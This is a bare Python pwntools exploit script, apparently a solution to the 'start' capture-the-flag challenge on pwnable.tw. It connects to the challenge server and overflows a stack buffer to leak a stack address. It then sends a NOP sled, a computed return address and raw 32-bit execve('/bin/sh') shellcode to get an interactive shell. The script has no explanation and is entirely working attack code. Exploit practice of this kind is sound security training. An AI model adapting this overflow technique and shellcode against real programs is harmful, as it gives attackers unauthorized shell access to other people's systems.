#!/usr/bin/env python

from pwn import *
import sys

WRITE_ADDR = p32(0x8048087)

shell = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
shell += "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99"
shell += "\xb0\x0b\xcd\x80"


# proc = process("./start")
proc = remote("chall.pwnable.tw", 10000)


print proc.recvuntil(":")


payload = "A" * 20
payload += WRITE_ADDR
proc.send(payload)
stack_addr = u32(proc.recv(4))

print "Stack address leak : " + hex(stack_addr)

payload = asm(shellcraft.i386.nop() * 20)
payload += p32(stack_addr + 20)
payload += shell

proc.send(payload)
proc.interactive()